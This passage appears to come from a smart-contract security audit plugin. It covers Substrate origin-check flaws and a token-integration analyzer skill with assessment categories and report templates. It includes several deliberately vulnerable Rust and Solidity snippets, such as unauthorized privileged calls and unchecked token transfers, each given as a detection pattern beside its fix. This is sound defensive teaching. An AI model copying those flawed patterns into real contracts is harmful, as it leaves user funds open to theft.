risk\n\n// SECURE for production\npallet_babe::RandomnessFromOneEpochAgo  // VRF-based, high security\n\n// SECURE for testing only\npallet_insecure_randomness_collective_flip  // Explicit \"insecure\" naming\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/substrate/randomness\n\n---\n\n## 4.7 BAD ORIGIN  CRITICAL\n\n**Description**: Using `ensure_signed` for privileged operations instead of proper origin validation (`ensure_root`, custom origins) allows unauthorized access.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Using ensure_signed for privileged operation\n#[pallet::call]\nimpl<T: Config> Pallet<T> {\n    pub fn emergency_pause(origin: OriginFor<T>) -> DispatchResult {\n        let _caller = ensure_signed(origin)?;  // WRONG: Any signed user!\n        <SystemPaused<T>>::put(true);  // Critical operation with no real authorization\n        Ok(())\n    }\n\n    pub fn set_global_config(\n        origin: OriginFor<T>,\n        new_fee: Balance,\n    ) -> DispatchResult {\n        let _caller = ensure_signed(origin)?;  // WRONG: Any user can change fees!\n        <GlobalFee<T>>::put(new_fee);\n        Ok(())\n    }\n}\n\n// VULNERABLE: Not using configured ForceOrigin\npub fn force_transfer(\n    origin: OriginFor<T>,\n    from: T::AccountId,\n    to: T::AccountId,\n) -> DispatchResult {\n    let _admin = ensure_signed(origin)?;  // WRONG: Should check ForceOrigin!\n    // Should be: T::ForceOrigin::ensure_origin(origin)?;\n    Self::do_transfer(from, to)?;\n    Ok(())\n}\n```\n\n**What to Check**:\n- [ ] Root-level operations use `ensure_root(origin)?`\n- [ ] Privileged operations use custom origin types (ForceOrigin, AdminOrigin)\n- [ ] `ensure_signed` only for user-level operations\n- [ ] Origin configuration documented for governance\n- [ ] Sudo privileges removed before production launch\n\n**Mitigation**:\n```rust\n// SECURE: Use ensure_root for root operations\n#[pallet::call]\nimpl<T: Config> Pallet<T> {\n    #[pallet::weight(10_000)]\n    pub fn emergency_pause(origin: OriginFor<T>) -> DispatchResult {\n        ensure_root(origin)?;  // Only root account\n        <SystemPaused<T>>::put(true);\n        Self::deposit_event(Event::SystemPaused);\n        Ok(())\n    }\n}\n\n// SECURE: Use custom origin types for privileged operations\n#[pallet::config]\npub trait Config: frame_system::Config {\n    /// Origin that can execute force operations\n    type ForceOrigin: EnsureOrigin<Self::RuntimeOrigin>;\n\n    /// Origin that can update parameters\n    type UpdateOrigin: EnsureOrigin<Self::RuntimeOrigin>;\n}\n\n#[pallet::call]\nimpl<T: Config> Pallet<T> {\n    #[pallet::weight(10_000)]\n    pub fn force_transfer(\n        origin: OriginFor<T>,\n        from: T::AccountId,\n        to: T::AccountId,\n        amount: BalanceOf<T>,\n    ) -> DispatchResult {\n        // Validate against configured ForceOrigin\n        T::ForceOrigin::ensure_origin(origin)?;\n\n        Self::do_transfer(from, to, amount)?;\n        Ok(())\n    }\n\n    #[pallet::weight(10_000)]\n    pub fn update_fee(\n        origin: OriginFor<T>,\n        new_fee: BalanceOf<T>,\n    ) -> DispatchResult {\n        // Validate against configured UpdateOrigin\n        T::UpdateOrigin::ensure_origin(origin)?;\n\n        <GlobalFee<T>>::put(new_fee);\n        Self::deposit_event(Event::FeeUpdated { new_fee });\n        Ok(())\n    }\n\n    #[pallet::weight(10_000)]\n    pub fn transfer(\n        origin: OriginFor<T>,\n        to: T::AccountId,\n        amount: BalanceOf<T>,\n    ) -> DispatchResult {\n        // Regular user operation - ensure_signed is correct\n        let from = ensure_signed(origin)?;\n\n        Self::do_transfer(from, to, amount)?;\n        Ok(())\n    }\n}\n\n// Runtime configuration\nimpl pallet_example::Config for Runtime {\n    // Require governance approval for force operations\n    type ForceOrigin = EnsureRootOrHalfCouncil;\n\n    // Require 2/3 council for parameter updates\n    type UpdateOrigin = EnsureRootOrTwoThirdsCouncil;\n}\n```\n\n**Origin Types Reference**:\n```rust\n// Built-in origins\nensure_root(origin)?              // Root/sudo only\nensure_signed(origin)?            // Any signed account\nensure_none(origin)?              // Unsigned (use with extreme caution)\n\n// Custom origins (configured in runtime)\nT::ForceOrigin::ensure_origin(origin)?\nT::UpdateOrigin::ensure_origin(origin)?\nT::AdminOrigin::ensure_origin(origin)?\n\n// Common origin configurations\nEnsureRoot                        // Root only\nEnsureSigned                      // Any signed\nEnsureSignedBy<AccountId>         // Specific account\nEnsureRootOrHalfCouncil          // Root or 50%+ council\nEnsureRootOrTwoThirdsCouncil     // Root or 67%+ council\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/substrate/bad_origin\n",
        "plugins/building-secure-contracts/skills/token-integration-analyzer/SKILL.md": "---\nname: token-integration-analyzer\ndescription: Token integration and implementation analyzer based on Trail of Bits' token integration checklist. Analyzes token implementations for ERC20/ERC721 conformity, checks for 20+ weird token patterns, assesses contract composition and owner privileges, performs on-chain scarcity analysis, and evaluates how protocols handle non-standard tokens. Context-aware for both token implementations and token integrations.\n---\n\n# Token Integration Analyzer\n\n## Purpose\n\nSystematically analyzes the codebase for token-related security concerns using Trail of Bits' token integration checklist:\n\n1. **Token Implementations**: Analyze if your token follows ERC20/ERC721 standards or has non-standard behavior\n2. **Token Integrations**: Analyze how your protocol handles arbitrary tokens, including weird/non-standard tokens\n3. **On-chain Analysis**: Query deployed contracts for scarcity, distribution, and configuration\n4. **Security Assessment**: Identify risks from 20+ known weird token patterns\n\n**Framework**: Building Secure Contracts - Token Integration Checklist + Weird ERC20 Database\n\n---\n\n## How This Works\n\n### Phase 1: Context Discovery\nDetermines analysis context:\n- **Token implementation**: Are you building a token contract?\n- **Token integration**: Does your protocol interact with external tokens?\n- **Platform**: Ethereum, other EVM chains, or different platform?\n- **Token types**: ERC20, ERC721, or both?\n\n### Phase 2: Slither Analysis (if Solidity)\nFor Solidity projects, I'll help run:\n- `slither-check-erc` - ERC conformity checks\n- `slither --print human-summary` - Complexity and upgrade analysis\n- `slither --print contract-summary` - Function analysis\n- `slither-prop` - Property generation for testing\n\n### Phase 3: Code Analysis\nAnalyzes:\n- Contract composition and complexity\n- Owner privileges and centralization risks\n- ERC20/ERC721 conformity\n- Known weird token patterns\n- Integration safety patterns\n\n### Phase 4: On-chain Analysis (if deployed)\nIf you provide a contract address, I'll query:\n- Token scarcity and distribution\n- Total supply and holder concentration\n- Exchange listings\n- On-chain configuration\n\n### Phase 5: Risk Assessment\nProvides:\n- Identified vulnerabilities\n- Non-standard behaviors\n- Integration risks\n- Prioritized recommendations\n\n---\n\n## Assessment Categories\n\nI check 10 comprehensive categories covering all aspects of token security. For detailed criteria, patterns, and checklists, see [ASSESSMENT_CATEGORIES.md](resources/ASSESSMENT_CATEGORIES.md).\n\n### Quick Reference:\n\n1. **General Considerations** - Security reviews, team transparency, security contacts\n2. **Contract Composition** - Complexity analysis, SafeMath usage, function count, entry points\n3. **Owner Privileges** - Upgradeability, minting, pausability, blacklisting, team accountability\n4. **ERC20 Conformity** - Return values, metadata, decimals, race conditions, Slither checks\n5. **ERC20 Extension Risks** - External calls/hooks, transfer fees, rebasing/yield-bearing tokens\n6. **Token Scarcity Analysis** - Supply distribution, holder concentration, exchange distribution, flash loan/mint risks\n7. **Weird ERC20 Patterns** (24 patterns including):\n   - Reentrant calls (ERC777 hooks)\n   - Missing return values (USDT, BNB, OMG)\n   - Fee on transfer (STA, PAXG)\n   - Balance modifications outside transfers (Ampleforth, Compound)\n   - Upgradable tokens (USDC, USDT)\n   - Flash mintable (DAI)\n   - Blocklists (USDC, USDT)\n   - Pausable tokens (BNB, ZIL)\n   - Approval race protections (USDT, KNC)\n   - Revert on approval/transfer to zero address\n   - Revert on zero value approvals/transfers\n   - Multiple token addresses\n   - Low decimals (USDC: 6, Gemini: 2)\n   - High decimals (YAM-V2: 24)\n   - transferFrom with src == msg.sender\n   - Non-string metadata (MKR)\n   - No revert on failure (ZRX, EURS)\n   - Revert on large approvals (UNI, COMP)\n   - Code injection via token name\n   - Unusual permit function (DAI, RAI, GLM)\n   - Transfer less than amount (cUSDCv3)\n   - ERC-20 native currency representation (Celo, Polygon, zkSync)\n   - [And more...](resources/ASSESSMENT_CATEGORIES.md#7-weird-erc20-patterns)\n8. **Token Integration Safety** - Safe transfer patterns, balance verification, allowlists, wrappers, defensive patterns\n9. **ERC721 Conformity** - Transfer to 0x0, safeTransferFrom, metadata, ownerOf, approval clearing, token ID immutability\n10. **ERC721 Common Risks** - onERC721Received reentrancy, safe minting, burning approval clearing\n\n---\n\n## Example Output\n\nWhen analysis is complete, you'll receive a comprehensive report structured as follows:\n\n```\n=== TOKEN INTEGRATION ANALYSIS REPORT ===\n\nProject: MultiToken DEX\nToken Analyzed: Custom Reward Token + Integration Safety\nPlatform: Solidity 0.8.20\nAnalysis Date: March 15, 2024\n\n---\n\n## EXECUTIVE SUMMARY\n\nToken Type: ERC20 Implementation + Protocol Integrating External Tokens\nOverall Risk Level: MEDIUM\nCritical Issues: 2\nHigh Issues: 3\nMedium Issues: 4\n\n**Top Concerns:**\n Fee-on-transfer tokens not handled correctly\n No validation for missing return values (USDT compatibility)\n Owner can mint unlimited tokens without cap\n\n**Recommendation:** Address critical/high issues before mainnet launch.\n\n---\n\n## 1. GENERAL CONSIDERATIONS\n\n Contract audited by CertiK (June 2023)\n Team contactable via security@project.com\n No security mailing list for critical announcements\n\n**Risk:** Users won't be notified of critical issues\n**Action:** Set up security@project.com mailing list\n\n---\n\n## 2. CONTRACT COMPOSITION\n\n### Complexity Analysis\n\n**Slither human-summary Results:**\n- 456 lines of code\n- Cyclomatic complexity: Average 6, Max 14 (transferWithFee())\n- 12 functions, 8 state variables\n- Inheritance depth: 3 (moderate)\n\n Contract complexity is reasonable\n transferWithFee() complexity high (14) - consider splitting\n\n### SafeMath Usage\n\n Using Solidity 0.8.20 (built-in overflow protection)\n No unchecked blocks found\n All arithmetic operations protected\n\n### Non-Token Functions\n\n**Functions Beyond ERC20:**\n- setFeeCollector() - Admin function \n- setTransferFee() - Admin function \n- withdrawFees() - Admin function \n- pause()/unpause() - Emergency functions \n\n 4 non-token functions (acceptable but adds complexity)\n\n### Address Entry Points\n\n Single contract address\n No proxy with multiple entry points\n No token migration creating address confusion\n\n**Status:** PASS\n\n---\n\n## 3. OWNER PRIVILEGES\n\n### Upgradeability\n\n Contract uses TransparentUpgradeableProxy\n**Risk:** Owner can change contract logic at any time\n\n**Current Implementation:**\n- ProxyAdmin: 0x1234... (2/3 multisig) \n- Timelock: None \n\n**Recommendation:** Add 48-hour timelock to all upgrades\n\n### Minting Capabilities\n\n CRITICAL: Unlimited minting\nFile: contracts/RewardToken.sol:89\n```solidity\nfunction mint(address to, uint256 amount) external onlyOwner {\n    _mint(to, amount);  // No cap!\n}\n```\n\n**Risk:** Owner can inflate supply arbitrarily\n**Fix:** Add maximum supply cap or rate-limited minting\n\n### Pausability\n\n Pausable pattern implemented (OpenZeppelin)\n Only owner can pause\n Paused state affects all transfers (including existing holders)\n\n**Risk:** Owner can trap all user funds\n**Mitigation:** Use multi-sig for pause function (already implemented )\n\n### Blacklisting\n\n No blacklist functionality\n**Assessment:** Good - no centralized censorship risk\n\n### Team Transparency\n\n Team members public (team.md)\n Company registered in Switzerland\n Accountable and contactable\n\n**Status:** ACCEPTABLE\n\n---\n\n## 4. ERC20 CONFORMITY\n\n### Slither-check-erc Results\n\nCommand: slither-check-erc . RewardToken --erc erc20\n\n transfer returns bool\n transferFrom returns bool\n name, decimals, symbol present\n decimals returns uint8 (value: 18)\n Race condition mitigated (increaseAllowance/decreaseAllowance)\n\n**Status:** FULLY COMPLIANT\n\n### slither-prop Test Results\n\nCommand: slither-prop . --contract RewardToken\n\n**Generated 12 properties, all passed:**\n Transfer doesn't change total supply\n Allowance correctly updates\n Balance updates match transfer amounts\n No balance manipulation possible\n[... 8 more properties ...]\n\n**Echidna fuzzing:** 50,000 runs, no violations \n\n**Status:** EXCELLENT\n\n---\n\n## 5. WEIRD TOKEN PATTERN ANALYSIS\n\n### Integration Safety Check\n\n**Your Protocol Integrates 5 External Tokens:**\n1. USDT (0xdac17f9...)\n2. USDC (0xa0b86991...)\n3. DAI (0x6b175474...)\n4. WETH (0xc02aaa39...)\n5. UNI (0x1f9840a8...)\n\n### Critical Issues Found\n\n **Pattern 7.2: Missing Return Values**\n**Found in:** USDT integration\nFile: contracts/Vault.sol:156\n```solidity\nIERC20(usdt).transferFrom(msg.sender, address(this), amount);\n// No return value check! USDT doesn't return bool\n```\n\n**Risk:** Silent failures on USDT transfers\n**Exploit:** User appears to deposit, but no tokens moved\n**Fix:** Use OpenZeppelin SafeERC20 wrapper\n\n---\n\n **Pattern 7.3: Fee on Transfer**\n**Risk for:** Any token with transfer fees\nFile: contracts/Vault.sol:170\n```solidity\nuint256 balanceBefore = IERC20(token).balanceOf(address(this));\ntoken.transferFrom(msg.sender, address(this), amount);\nshares = amount * exchangeRate;  // WRONG! Should use actual received amount\n```\n\n**Risk:** Accounting mismatch if token takes fees\n**Exploit:** User credited more shares than tokens deposited\n**Fix:** Calculate shares from `balanceAfter - balanceBefore`\n\n---\n\n### Known Non-Standard Token Handling\n\n **USDC:** Properly handled (SafeERC20, 6 decimals accounted for)\n **DAI:** permit() function not used (opportunity for gas savings)\n **USDT:** Missing return value not handled (CRITICAL)\n **WETH:** Standard wrapper, properly handled\n **UNI:** Large approval handling not checked (reverts >= 2^96)\n\n---\n\n[... Additional sections for remaining analysis categories ...]\n```\n\nFor complete report template and deliverables format, see [REPORT_TEMPLATES.md](resources/REPORT_TEMPLATES.md).\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"Token looks standard, ERC20 checks pass\" | 20+ weird token patterns exist beyond ERC20 compliance | Check ALL weird token patterns from database (missing return, revert on zero, hooks, etc.) |\n| \"Slither shows no issues, integration is safe\" | Slither detects some patterns, misses integration logic | Complete manual analysis of all 5 token integration criteria |\n| \"No fee-on-transfer detected, skip that check\" | Fee-on-transfer can be owner-controlled or conditional | Test all transfer scenarios, check for conditional fee logic |\n| \"Balance checks exist, handling is safe\" | Balance checks alone don't protect against all weird tokens | Verify safe transfer wrappers, revert handling, approval patterns |\n| \"Token is deployed by reputable team, assume standard\" | Reputation doesn't guarantee standard behavior | Analyze actual code and on-chain behavior, don't trust assumptions |\n| \"Integration uses OpenZeppelin, must be safe\" | OpenZeppelin libraries don't protect against weird external tokens | Verify defensive patterns around all external token calls |\n| \"Can't run Slither, skipping automated analysis\" | Slither provides critical ERC conformance checks | Manually verify all slither-check-erc criteria or document why blocked |\n| \"This pattern seems fine\" | Intuition misses subtle token integration bugs | Systematically check all 20+ weird token patterns with code evidence |\n\n---\n\n## Deliverables\n\nWhen analysis is complete, I'll provide:\n\n1. **Compliance Checklist** - Checkboxes for all assessment categories\n2. **Weird Token Pattern Analysis** - Presence/absence of all 24 patterns with risk levels and evidence\n3. **On-chain Analysis Report** (if applicable) - Holder distribution, exchange listings, configuration\n4. **Integration Safety Assessment** (if applicable) - Safe transfer usage, defensive patterns, weird token handling\n5. **Prioritized Recommendations** - CRITICAL/HIGH/MEDIUM/LOW issues with specific fixes\n\nComplete deliverable templates available in [REPORT_TEMPLATES.md](resources/REPORT_TEMPLATES.md).\n\n---\n\n## Ready to Begin\n\n**What I'll need**:\n- Your codebase\n- Context: Token implementation or integration?\n- Token type: ERC20, ERC721, or both?\n- Contract address (if deployed and want on-chain analysis)\n- RPC endpoint (if querying on-chain)\n\nLet's analyze your token implementation or integration for security risks!\n",
        "plugins/building-secure-contracts/skills/token-integration-analyzer/resources/ASSESSMENT_CATEGORIES.md": "# Assessment Categories Reference\n\nThis document contains detailed assessment criteria for token analysis. Each category includes what to check, analysis methods, and verification checklists.\n\n---\n\n## 1. GENERAL CONSIDERATIONS\n\n**What I'll check**:\n- Security review history\n- Team contacts and transparency\n- Security mailing list existence\n\n**I'll ask you**:\n- Has this token been audited?\n- Is the team contactable?\n- Is there a security mailing list?\n\n**Best practices**:\n- Interact only with reviewed tokens\n- Maintain contact with token teams\n- Subscribe to security announcements\n\n---\n\n## 2. CONTRACT COMPOSITION\n\n**What I'll analyze**:\n\n**Complexity**:\n- Overall contract complexity\n- Lines of code\n- Inheritance depth\n- Function count\n- Use Slither's `human-summary` printer\n\n**SafeMath Usage** (pre-0.8 Solidity):\n- Arithmetic operations protection\n- Unchecked blocks justification\n\n**Non-token Functions**:\n- Functions beyond standard ERC interface\n- Unnecessary complexity\n- Use Slither's `contract-summary` printer\n\n**Single Address Entry Point**:\n- Multiple addresses pointing to same token\n- Proxy patterns that create multiple entry points\n\n**Checks**:\n- [ ] Contract avoids unnecessary complexity\n- [ ] Contract uses SafeMath or Solidity 0.8+ (for Solidity)\n- [ ] Contract has only a few non-token-related functions\n- [ ] Token has only one address entry point\n\n---\n\n## 3. OWNER PRIVILEGES\n\n**What I'll check**:\n\n**Upgradeability**:\n- Proxy patterns (UUPS, Transparent, Beacon)\n- Implementation change mechanisms\n- Use Slither's `human-summary` printer\n\n**Minting Capabilities**:\n- Unlimited vs limited minting\n- Minting access controls\n- Total supply caps\n\n**Pausability**:\n- Pause mechanisms\n- Who can pause\n- Impact on existing holders\n\n**Blacklisting**:\n- Blocklist functionality\n- Admin controls\n- USDC/USDT-style blocklists\n\n**Team Transparency**:\n- Known team members\n- Legal jurisdiction\n- Accountability\n\n**Checks**:\n- [ ] Token is not upgradeable (or upgrade risks understood)\n- [ ] Owner has limited minting capabilities\n- [ ] Token is not pausable (or pause risks understood)\n- [ ] Owner cannot blacklist addresses (or risks understood)\n- [ ] Team is known and accountable\n\n---\n\n## 4. ERC20 CONFORMITY CHECKS\n\n**What I'll analyze**:\n\n**Return Values**:\n- `transfer` returns bool\n- `transferFrom` returns bool\n- Missing returns (USDT, BNB, OMG pattern)\n- False returns (Tether Gold pattern)\n\n**Function Presence**:\n- `name`, `decimals`, `symbol` existence\n- Optional functions handling\n\n**Decimals Type**:\n- Returns `uint8`\n- Value below 255\n- Low decimals (USDC: 6, Gemini USD: 2)\n- High decimals (YAM-V2: 24)\n\n**Race Condition Mitigation**:\n- ERC20 approve race condition\n- Increase/decrease allowance pattern\n- USDT/KNC approval protection\n\n**Slither Tools**:\n- Run `slither-check-erc` for automated checks\n- Run `slither-prop` to generate properties\n\n**Checks**:\n- [ ] `transfer` and `transferFrom` return boolean\n- [ ] `name`, `decimals`, `symbol` present if used\n- [ ] `decimals` returns `uint8` with value < 255\n- [ ] Token mitigates ERC20 race condition\n- [ ] Contract passes `slither-check-erc` tests\n- [ ] Contract passes `slither-prop` generated tests\n\n---\n\n## 5. ERC20 EXTENSION RISKS\n\n**What I'll check**:\n\n**External Calls in Transfers**:\n- ERC777 hooks\n- Reentrancy risks\n- `tokensReceived` callbacks\n- Check for: Amp (AMP), imBTC patterns\n\n**Transfer Fees**:\n- Deflationary tokens\n- Fee-on-transfer (STA, PAXG)\n- Future fee risks (USDT, USDC can add fees)\n- Balance checks after transfer\n\n**Interest/Yield Bearing**:\n- Rebasing tokens (Ampleforth)\n- Airdropped governance tokens\n- Compound-style interest\n- Cached balance issues\n\n**Checks**:\n- [ ] Token is not ERC777 or has no external calls in transfer\n- [ ] `transfer`/`transferFrom` do not take fees\n- [ ] Interest earned from token is accounted for\n\n---\n\n## 6. TOKEN SCARCITY ANALYSIS\n\n**What I'll do**:\n\nFor deployed tokens, I'll query on-chain data using web3/ethers:\n\n**Supply Distribution**:\n```javascript\n// Query holder distribution\n// Check top 10 holders percentage\n// Identify concentration risk\n```\n\n**Total Supply**:\n```javascript\n// Query totalSupply\n// Check if sufficient for manipulation resistance\n// Identify low supply risk\n```\n\n**Exchange Distribution**:\n```javascript\n// Query balance on major DEXs/CEXs\n// Check if tokens concentrated in one exchange\n// Identify single point of failure\n```\n\n**Flash Loan Risk**:\n- Large fund attack potential\n- Flash loan availability for this token\n\n**Flash Minting**:\n- Flash mint functions (DAI-style)\n- Maximum mintable amount\n- Overflow risks\n\n**Checks**:\n- [ ] Supply owned by more than a few users\n- [ ] Total supply is sufficient\n- [ ] Tokens located in more than a few exchanges\n- [ ] Flash loan/large fund risks understood\n- [ ] Token does not allow flash minting (or risks understood)\n\n**Note**: I'll only perform on-chain analysis if you provide a contract address. Won't hallucinate if not applicable.\n\n---\n\n## 7. WEIRD ERC20 PATTERNS\n\nI'll check for all 20+ known weird token patterns:\n\n### 7.1 Reentrant Calls\n- ERC777 tokens with hooks\n- Transfer callbacks\n- Historical exploits: imBTC Uniswap, lendf.me\n\n**Tokens**: Amp (AMP), imBTC\n\n### 7.2 Missing Return Values\n- No bool return on transfer/transferFrom\n- Some methods return, others don't\n- False returns on success (Tether Gold)\n\n**Tokens**: USDT, BNB, OMG, Tether Gold\n\n### 7.3 Fee on Transfer\n- Transfer fees (STA, PAXG)\n- Future fee capability (USDT, USDC)\n- Deflationary mechanics\n\n**Exploit**: Balancer STA hack ($500k)\n\n### 7.4 Balance Modifications Outside Transfers\n- Rebasing tokens (Ampleforth)\n- Governance airdrops (Compound)\n- Mintable/burnable by admin\n- Cached balance risks\n\n### 7.5 Upgradable Tokens\n- USDC, USDT upgradeability\n- Logic change risks\n- Freeze integration on upgrade\n\n### 7.6 Flash Mintable\n- DAI flash mint module\n- `type(uint256).max` supply risk\n- One-transaction minting\n\n### 7.7 Blocklists\n- USDC, USDT blocklists\n- Admin-controlled blocking\n- Contract trap risk\n- Regulatory/extortion risk\n\n### 7.8 Pausable Tokens\n- BNB, ZIL pause functionality\n- Admin pause risk\n- User fund trap\n\n### 7.9 Approval Race Protections\n- USDT, KNC approval restrictions\n- Cannot approve M > 0 when N > 0 approved\n- Integration issues\n\n### 7.10 Revert on Approval to Zero Address\n- OpenZeppelin pattern\n- `approve(address(0), amt)` reverts\n- Special case handling needed\n\n### 7.11 Revert on Zero Value Approvals\n- BNB pattern\n- `approve(address, 0)` reverts\n- Approval reset issues\n\n### 7.12 Revert on Zero Value Transfers\n- LEND pattern\n- Zero amount transfers fail\n- Edge case handling\n\n### 7.13 Multiple Token Addresses\n- Proxied tokens with multiple addresses\n- Address-based tracking broken\n- Rescue function exploits\n\n### 7.14 Low Decimals\n- USDC: 6 decimals\n- Gemini USD: 2 decimals\n- Precision loss amplified\n\n### 7.15 High Decimals\n- YAM-V2: 24 decimals\n- Overflow risks\n- Liveness issues\n\n### 7.16 transferFrom with src == msg.sender\n- DSToken: no allowance decrease\n- OpenZeppelin: always decrease\n- Different semantics\n\n### 7.17 Non-string Metadata\n- MKR: bytes32 name/symbol\n- Metadata consumption issues\n- Type casting needed\n\n### 7.18 Revert on Transfer to Zero Address\n- OpenZeppelin pattern\n- Burn mechanism broken\n- Zero address handling\n\n### 7.19 No Revert on Failure\n- ZRX, EURS pattern\n- Returns false instead of reverting\n- Forgotten require wrapping\n\n### 7.20 Revert on Large Approvals\n- UNI, COMP: max uint96\n- uint256(-1) special case\n- Allowance mapping mismatch\n\n### 7.21 Code Injection via Token Name\n- Malicious JavaScript in name\n- Frontend exploits\n- Etherdelta hack pattern\n\n### 7.22 Unusual Permit Function\n- DAI, RAI, GLM non-EIP2612 permit\n- No revert on unsupported permit\n- Phantom function execution\n\n### 7.23 Transfer Less Than Amount\n- cUSDCv3 type(uint256).max handling\n- Only balance transferred\n- Vault accounting broken\n\n### 7.24 ERC-20 Native Currency Representation\n- Celo: CELO token\n- Polygon: POL token\n- zkSync Era: ETH token\n- Double spending risks\n\n**Exploit**: Uniswap V4 critical vulnerability\n\n**For each pattern I'll**:\n- Search for implementation\n- Assess risk level\n- Check integration safety\n- Provide mitigation strategies\n\n---\n\n## 8. TOKEN INTEGRATION SAFETY\n\n**If analyzing a protocol that integrates tokens**:\n\n**What I'll check**:\n\n**Safe Transfer Pattern**:\n```solidity\n// Check for proper transfer handling\n// Verify return value checking\n// Look for SafeERC20 usage\n```\n\n**Balance Verification**:\n```solidity\n// Check balance before and after\n// Don't assume transfer amount = actual amount\n// Fee-on-transfer protection\n```\n\n**Allowlist Pattern**:\n```solidity\n// Contract-level allowlist\n// Known good tokens\n// UI-level filtering\n```\n\n**Wrapper Contracts**:\n```solidity\n// Edge wrappers for external tokens\n// Consistent internal semantics\n// Isolation of weird behavior\n```\n\n**Defensive Patterns**:\n- Reentrancy guards on token interactions\n- Balance caching strategies\n- Upgrade detection mechanisms\n- Zero value handling\n- Return value verification\n\n---\n\n## 9. ERC721 CONFORMITY CHECKS\n\n**What I'll analyze**:\n\n**Transfer to 0x0**:\n- Should revert per standard\n- Burning mechanism\n- Token loss prevention\n\n**safeTransferFrom Implementation**:\n- Correct signature\n- onERC721Received callback\n- NFT loss to contracts\n\n**Metadata Functions**:\n- `name`, `symbol` presence\n- Can return empty string\n- `decimals` returns `uint8(0)` if present\n\n**ownerOf Behavior**:\n- Reverts for invalid tokenId\n- Reverts for burned tokens\n- Never returns 0x0\n\n**Transfer Clears Approvals**:\n- Per standard requirement\n- Approval state management\n\n**Token ID Immutability**:\n- ID cannot change during lifetime\n- Per standard requirement\n\n**Checks**:\n- [ ] Transfers to 0x0 revert\n- [ ] `safeTransferFrom` implemented correctly\n- [ ] `name`, `symbol` present if used\n- [ ] `decimals` returns `uint8(0)` if present\n- [ ] `ownerOf` reverts for invalid/burned tokens\n- [ ] Transfers clear approvals\n- [ ] Token IDs immutable during lifetime\n\n---\n\n## 10. ERC721 COMMON RISKS\n\n**What I'll check**:\n\n**onERC721Received Callback**:\n- Reentrancy via callback\n- safeMint risks\n- External call ordering\n\n**Safe Minting to Contracts**:\n- Minting functions behave like `safeTransferFrom`\n- Prevent NFT loss to contracts\n- Handle contract recipients\n\n**Burning Clears Approvals**:\n- Burn function existence\n- Approval clearing\n- Approval state after burn\n\n**Checks**:\n- [ ] `onERC721Received` callback reentrancy protected\n- [ ] NFTs safely minted to smart contracts\n- [ ] Burning tokens clears approvals\n\n---\n\n## Slither Integration\n\n### Commands I'll Help Run\n\n**ERC Conformity Check**:\n```bash\n# For ERC20\nslither-check-erc [address-or-path] TokenName --erc erc20\n\n# For ERC721\nslither-check-erc [address-or-path] TokenName --erc erc721\n```\n\n**Contract Analysis**:\n```bash\n# Human-readable summary (complexity, upgrades, etc.)\nslither [target] --print human-summary\n\n# Function and modifier summary\nslither [target] --print contract-summary\n```\n\n**Property Generation**:\n```bash\n# Generate test properties for Echidna/Manticore\nslither-prop . --contract TokenName\n```\n\n**Note**: I'll adapt based on whether tools are available. I can work without Slither but recommend using it for Solidity projects.\n\n---\n\n## On-chain Analysis Integration\n\n### Querying Deployed Contracts\n\nIf you provide a contract address, I can query on-chain data:\n\n**Setup**:\n```javascript\n// I'll use web3.js or ethers.js\nconst Web3 = require('web3');\nconst web3 = new Web3('RPC_URL');\n```\n\n**Token Information**:\n```javascript\n// Query basic info\nconst name = await token.methods.name().call();\nconst symbol = await token.methods.symbol().call();\nconst decimals = await token.methods.decimals().call();\nconst totalSupply = await token.methods.totalSupply().call();\n```\n\n**Holder Analysis**:\n```javascript\n// Query top holders\n// Calculate concentration\n// Identify whale risk\n```\n\n**Exchange Analysis**:\n```javascript\n// Query balances on Uniswap, Curve, etc.\n// Check centralization in single exchange\n```\n\n**Configuration**:\n```javascript\n// Query owner/admin\n// Check pause status\n// Verify upgrade configuration\n```\n\n**Note**: I'll only perform on-chain queries if you provide an address and RPC endpoint. Won't hallucinate if not applicable.\n\n---\n\n## Known Non-Standard Tokens Database\n\nI have comprehensive knowledge of known non-standard tokens:\n\n### Missing Revert\n- Basic Attention Token (BAT)\n- Huobi Token (HT)\n- Compound USD Coin (cUSDC)\n- 0x Protocol Token (ZRX)\n\n### Transfer Hooks (Reentrant)\n- Amp (AMP)\n- The Tokenized Bitcoin (imBTC)\n\n### Missing Return Data\n- Binance Coin (BNB) - only on `transfer`\n- OMGToken (OMG)\n- Tether USD (USDT)\n\n### Permit No-op\n- Wrapped Ether (WETH)\n\n### Additional Non-Standard\n- USDC: upgradeable, 6 decimals\n- DAI: non-standard permit, flash mintable\n- UNI, COMP: revert on large approvals (>= 2^96)\n\nI'll check if your codebase interacts with any of these and verify proper handling.\n",
        "plugins/building-secure-contracts/skills/token-integration-analyzer/resources/REPORT_TEMPLATES.md": "# Report Templates\n\nThis document contains report templates and deliverables formats for token integration analysis.\n\n---\n\n## 1. Compliance Checklist\n\n**General Considerations**:\n- [x/] Security review completed\n- [x/] Team contactable\n- [x/] Security mailing list exists\n\n**Contract Composition**:\n- [x/] Avoids unnecessary complexity\n- [x/] Uses SafeMath / Solidity 0.8+\n- [x/] Few non-token functions\n- [x/] Single address entry point\n\n**Owner Privileges**:\n- [x/] Not upgradeable / risks understood\n- [x/] Limited minting\n- [x/] Not pausable / risks understood\n- [x/] No blacklist / risks understood\n- [x/] Known team\n\n**ERC20 Conformity** (if applicable):\n- [x/] Returns boolean from transfer functions\n- [x/] Metadata functions present\n- [x/] Decimals returns uint8\n- [x/] Race condition mitigated\n- [x/] Passes slither-check-erc\n- [x/] No external calls in transfers\n- [x/] No transfer fees\n- [x/] Interest accounted for\n\n**Token Scarcity** (if applicable):\n- [x/] Distributed ownership\n- [x/] Sufficient total supply\n- [x/] Multiple exchange listings\n- [x/] Flash loan risks understood\n- [x/] No flash minting / risks understood\n\n**ERC721 Conformity** (if applicable):\n- [x/] Transfers to 0x0 revert\n- [x/] safeTransferFrom implemented\n- [x/] Metadata functions handled\n- [x/] ownerOf reverts properly\n- [x/] Transfers clear approvals\n- [x/] Token IDs immutable\n- [x/] onERC721Received protected\n- [x/] Safe minting implemented\n- [x/] Burning clears approvals\n\n---\n\n## 2. Weird Token Pattern Analysis\n\nFor each applicable pattern:\n- **Pattern name**\n- **Presence**: Found / Not Found\n- **Risk level**: Critical / High / Medium / Low\n- **Evidence**: File:line references\n- **Mitigation**: Recommendations\n\n---\n\n## 3. On-chain Analysis Report\n\n(If 